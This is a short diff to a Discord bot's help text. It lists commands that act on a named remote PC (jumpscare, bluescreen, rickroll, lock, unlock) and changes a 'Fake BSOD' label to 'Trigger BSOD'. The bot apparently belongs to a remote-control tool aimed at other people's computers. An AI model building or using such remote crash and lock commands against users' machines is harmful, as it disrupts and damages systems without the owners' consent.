@@ -1194,7 +1194,7 @@ async def help_command(ctx):
         name="🎭 **Fun Commands**",
         value=(
             "`!jumpscare PC-Name` - Trigger jumpscare\n"
-            "`!bluescreen PC-Name` - Fake BSOD\n"
+            "`!bluescreen PC-Name` - Trigger BSOD\n"
             "`!rickroll PC-Name` - Rickroll the user\n"
             "`!lock PC-Name` - Lock system\n"
             "`!unlock PC-Name` - Unlock system\n"
